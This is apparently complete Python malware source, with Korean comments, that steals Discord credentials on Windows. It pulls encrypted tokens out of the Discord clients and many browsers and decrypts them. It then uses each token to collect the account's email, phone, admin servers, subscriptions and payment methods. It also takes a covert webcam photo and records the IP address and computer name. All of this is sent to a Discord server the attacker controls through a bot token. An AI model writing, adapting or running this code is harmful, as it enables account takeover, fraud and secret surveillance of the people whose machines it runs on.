import os
if os.name != "nt":
    exit()
import subprocess
import sys
import json
import urllib.request
import urllib.parse
import re
import base64
import datetime
import tempfile
import shutil
import time
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import win32crypt
from Crypto.Cipher import AES
import cv2


def install_import(modules):
    for module, pip_name in modules:
        try:
            __import__(module)
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            os.execl(sys.executable, sys.executable, *sys.argv)

install_import([
    ("win32crypt", "pypiwin32"),
    ("Crypto.Cipher", "pycryptodome"),
    ("requests", "requests"),
    ("cv2", "opencv-python")
])


BOT_TOKEN = "봇 토큰 입력"
GUILD_ID = 서버아이디입력  # 정수

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    'Discord': ROAMING + '\\discord',
    'Discord Canary': ROAMING + '\\discordcanary',
    'Lightcord': ROAMING + '\\Lightcord',
    'Discord PTB': ROAMING + '\\discordptb',
    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
    'Amigo': LOCAL + '\\Amigo\\User Data',
    'Torch': LOCAL + '\\Torch\\User Data',
    'Kometa': LOCAL + '\\Kometa\\User Data',
    'Orbitum': LOCAL + '\\Orbitum\\User Data',
    'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
    '7Star': LOCAL + '\\7Star\\7Star\\User Data',
    'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
    'Vivaldi': LOCAL + '\\Vivaldi\\User Data\\Default',
    'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
    'Chrome': LOCAL + "\\Google\\Chrome\\User Data" + 'Default',
    'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
    'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Defaul',
    'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
    'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    'Iridium': LOCAL + '\\Iridium\\User Data\\Default'
}

def getheaders(token=None):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
    }
    if token:
        headers.update({"Authorization": token})
    return headers

def gettokens(path):
    path += "\\Local Storage\\leveldb\\"
    tokens = []
    if not os.path.exists(path):
        return tokens
    for file in os.listdir(path):
        if not file.endswith(".ldb") and file.endswith(".log"):
            continue
        try:
            with open(f"{path}{file}", "r", errors="ignore") as f:
                for line in (x.strip() for x in f.readlines()):
                    for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                        tokens.append(values)
        except PermissionError:
            continue
    return tokens

def getkey(path):
    with open(path + f"\\Local State", "r") as file:
        key = json.loads(file.read())['os_crypt']['encrypted_key']
        file.close()
    return key

def getip():
    try:
        with urllib.request.urlopen("https://api.ipify.org?format=json") as response:
            return json.loads(response.read().decode()).get("ip")
    except:
        return "None"

def capture_webcam():
    """웹캠 사진을 찍어 임시 파일 경로를 반환. 실패 시 None."""
    for idx in range(2):
        for backend in [cv2.CAP_ANY, cv2.CAP_DSHOW, cv2.CAP_MSMF]:
            try:
                cap = cv2.VideoCapture(idx, backend)
                if not cap.isOpened():
                    continue
                for _ in range(10):
                    cap.read()
                time.sleep(0.5)
                ret, frame = cap.read()
                if ret and frame is not None and frame.size > 0:
                    tmpfile = tempfile.mktemp(suffix=".webcam.jpg")
                    cv2.imwrite(tmpfile, frame)
                    cap.release()
                    return tmpfile
                cap.release()
            except:
                try:
                    cap.release()
                except:
                    pass
                continue
    return None

def sanitize_channel_name(name):
    """디스코드 채널 이름 규칙에 맞게 변환"""
    name = name.lower().strip()
    # 공백을 -로, 연속된 - 방지
    name = re.sub(r'[^a-z0-9\-]+', '-', name)
    name = re.sub(r'-+', '-', name)
    name = name.strip('-')
    # 최소 2글자 미만이면 접두사 추가
    if len(name) < 2:
        name = "usr-" + (name or "unknown")
    # 100자 제한
    return name[:100]

def api_get(url, bot_token):
    headers = {"Authorization": f"Bot {bot_token}"}
    return requests.get(url, headers=headers)

def api_post(url, bot_token, json_data=None, files=None):
    headers = {"Authorization": f"Bot {bot_token}"}
    if files:
        return requests.post(url, headers=headers, files=files, data=json_data)  # multipart
    else:
        headers["Content-Type"] = "application/json"
        return requests.post(url, headers=headers, json=json_data)

def get_or_create_channel(guild_id, channel_name, bot_token):
    """채널이 존재하면 ID 반환, 없으면 생성 후 반환"""
    # 기존 채널 검색
    url = f"https://discord.com/api/v10/guilds/{guild_id}/channels"
    channels = api_get(url, bot_token).json()
    for ch in channels:
        if ch["name"] == channel_name and ch["type"] == 0:  # 0 = text channel
            return ch["id"]

    # 없으면 생성
    create_url = f"https://discord.com/api/v10/guilds/{guild_id}/channels"
    payload = {
        "name": channel_name,
        "type": 0  # text channel
    }
    resp = api_post(create_url, bot_token, json_data=payload)
    if resp.status_code == 201:
        return resp.json()["id"]
    else:
        raise Exception(f"채널 생성 실패: {resp.status_code} {resp.text}")

def send_long_message(channel_id, content, bot_token, webcam_path=None):
    """2000자 이상이면 분할 전송, 파일은 첫 메시지에만 첨부"""
    # 파일 준비
    files = None
    if webcam_path and os.path.exists(webcam_path):
        with open(webcam_path, "rb") as f:
            file_data = f.read()
        files = {"file": ("webcam.jpg", file_data, "image/jpeg")}

    # 내용 분할
    lines = content.split('\n')
    chunks = []
    current = ""
    for line in lines:
        if len(current) + len(line) + 1 > 1990:
            chunks.append(current)
            current = line
        else:
            current += ("" if not current else "\n") + line
    if current:
        chunks.append(current)

    # 첫 번째 메시지에 파일 첨부
    for i, chunk in enumerate(chunks):
        if i == 0:
            resp = api_post(f"https://discord.com/api/v10/channels/{channel_id}/messages",
                            bot_token,
                            json_data={"content": chunk},
                            files=files)
        else:
            resp = api_post(f"https://discord.com/api/v10/channels/{channel_id}/messages",
                            bot_token,
                            json_data={"content": chunk})
        if resp.status_code != 200:
            print(f"메시지 전송 실패: {resp.status_code} {resp.text}")
        time.sleep(0.3)  # 레이트 리밋 조지기

def main():
    checked = []
    ip = getip()
    webcam_path = capture_webcam()  # 중복캡쳐없이 한번만캡쳐시키기

    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue

        for token in gettokens(path):
            token = token.replace("\\", "") if token.endswith("\\") else token
            try:
                token = AES.new(
                    win32crypt.CryptUnprotectData(base64.b64decode(getkey(path))[5:], None, None, None, 0)[1],
                    AES.MODE_GCM,
                    base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[3:15]
                ).decrypt(
                    base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[15:]
                )[:-16].decode()
                if token in checked:
                    continue
                checked.append(token)

                res = urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v10/users/@me', headers=getheaders(token)))
                if res.getcode() != 200:
                    continue
                res_json = json.loads(res.read().decode())

                username = res_json['username']
                user_id = res_json['id']
                email = res_json.get('email', 'N/A')
                phone = res_json.get('phone', 'N/A')
                mfa = res_json['mfa_enabled']
                flags = res_json['flags']
                locale = res_json['locale']
                verified = res_json['verified']

                params = urllib.parse.urlencode({"with_counts": True})
                res = json.loads(urllib.request.urlopen(
                    urllib.request.Request(f'https://discordapp.com/api/v6/users/@me/guilds?{params}',
                                           headers=getheaders(token))).read().decode())
                guilds = len(res)
                guild_infos = ""
                for guild in res:
                    if guild['permissions'] & 8 or guild['permissions'] & 32:
                        res2 = json.loads(urllib.request.urlopen(
                            urllib.request.Request(f'https://discordapp.com/api/v6/guilds/{guild["id"]}',
                                                   headers=getheaders(token))).read().decode())
                        vanity = f"; .gg/{res2['vanity_url_code']}" if res2.get("vanity_url_code") else ""
                        guild_infos += f"\n    - [{guild['name']}]: {guild['approximate_member_count']}{vanity}"
                if guild_infos == "":
                    guild_infos = "No admin guilds"

                res = json.loads(urllib.request.urlopen(
                    urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/subscriptions',
                                           headers=getheaders(token))).read().decode())
                has_nitro = bool(len(res) > 0)
                exp_date = "None"
                if has_nitro:
                    exp_date = datetime.datetime.strptime(
                        res[0]["current_period_end"], "%Y-%m-%dT%H:%M:%S.%f%z"
                    ).strftime('%d/%m/%Y at %H:%M:%S')

                res = json.loads(urllib.request.urlopen(
                    urllib.request.Request('https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots',
                                           headers=getheaders(token))).read().decode())
                boost_slots = ""
                available = 0
                boost_active = False
                for slot in res:
                    cooldown = datetime.datetime.strptime(slot["cooldown_ends_at"], "%Y-%m-%dT%H:%M:%S.%f%z")
                    if cooldown - datetime.datetime.now(datetime.timezone.utc) < datetime.timedelta(seconds=0):
                        boost_slots += f"    - Available now\n"
                        available += 1
                    else:
                        boost_slots += f"    - Available on {cooldown.strftime('%d/%m/%Y at %H:%M:%S')}\n"
                    boost_active = True

                payment_methods = 0
                valid_pm = 0
                pm_types = ""
                try:
                    pm_json = json.loads(urllib.request.urlopen(
                        urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/payment-sources',
                                               headers=getheaders(token))).read().decode())
                    for x in pm_json:
                        if x['type'] == 1:
                            pm_types += "CreditCard "
                            if not x['invalid']:
                                valid_pm += 1
                            payment_methods += 1
                        elif x['type'] == 2:
                            pm_types += "PayPal "
                            if not x['invalid']:
                                valid_pm += 1
                            payment_methods += 1
                except:
                    pass

                data_text = f"""
{'='*50}
Username: {username}
ID: {user_id}
Email: {email}
Phone: {phone}
MFA: {mfa}
Locale: {locale}
Verified: {verified}
Flags: {flags}

Guilds count: {guilds}
Admin guilds: {guild_infos}

Nitro: {has_nitro} | Expiry: {exp_date}
Boosts available: {available}
Boost slots:
{boost_slots if boost_slots else '    No boosts'}

Payment methods: {payment_methods} (valid: {valid_pm})
Types: {pm_types}

IP: {ip}
PC: {os.getenv("COMPUTERNAME")}
User: {os.getenv("UserName")}
Token origin: {platform}

Token: {token}
{'='*50}
"""
                # 채널 생성 및 전송
                channel_name = sanitize_channel_name(username)
                try:
                    channel_id = get_or_create_channel(GUILD_ID, channel_name, BOT_TOKEN)
                    send_long_message(channel_id, data_text, BOT_TOKEN, webcam_path)
                except Exception as e:
                    print(f"전송 실패 ({username}): {e}")

            except (urllib.error.HTTPError, json.JSONDecodeError):
                continue
            except Exception as e:
                print(f"ERROR: {e}")
                continue

    # 웹캠 파일 정리
    if webcam_path and os.path.exists(webcam_path):
        os.remove(webcam_path)

if __name__ == "__main__":
    main()
